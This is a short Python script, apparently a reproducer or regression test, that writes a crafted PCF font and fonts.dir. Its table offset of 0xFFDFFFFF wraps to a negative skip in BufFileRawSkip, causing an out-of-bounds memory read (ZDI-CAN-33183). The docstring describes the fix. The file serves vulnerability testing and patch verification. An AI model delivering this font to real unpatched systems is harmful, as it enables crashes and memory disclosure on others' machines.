#!/usr/bin/env python3
"""
Generate a malicious PCF font that triggers the BufFileRawSkip negative
skip out-of-bounds read (ZDI-CAN-33183).

The font has a single table entry with a huge offset (0xFFDFFFFF) that,
when subtracted from the current file position, wraps to a negative
value in the signed int parameter of BufFileRawSkip(). This moves the
buffer pointer backward past the buffer start, causing subsequent reads
to dereference invalid memory.

With the fix, BufFileRawSkip rejects negative count values and
pcfSeekToType validates the skip distance before calling FontFileSkip.

The generated PCF is intentionally minimal -- just enough to have a
valid magic number and TOC so that pcfReadTOC() succeeds and hands the
malicious table to pcfSeekToType().

The font must be opened through a font path element, so a fonts.dir is
also generated.  The XLFD is arbitrary since the font will never load
successfully.

Usage:
    python3 gen_evil_pcf_negskip.py <output_dir>

Creates <output_dir>/evil-negskip.pcf and <output_dir>/fonts.dir
"""

import struct
import sys
import os

PCF_PROPERTIES = 1


def u32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


# PCF magic, 1 table
out = b"\x01fcp" + u32(1)

# Table entry: type=PROPERTIES, format=0, size=0xFFFFFFFF,
# offset=0xFFDFFFFF -> wraps to negative skip
out += u32(PCF_PROPERTIES) + u32(0) + u32(0xFFFFFFFF) + u32(0xFFDFFFFF)

output_dir = sys.argv[1] if len(sys.argv) > 1 else "."
os.makedirs(output_dir, exist_ok=True)

pcf_name = "evil-negskip.pcf"
xlfd = "-evil-negskip-medium-r-normal--10-100-75-75-c-80-iso10646-1"

with open(os.path.join(output_dir, pcf_name), "wb") as f:
    f.write(out)

with open(os.path.join(output_dir, "fonts.dir"), "w") as f:
    f.write("1\n")
    f.write(f"{pcf_name} {xlfd}\n")
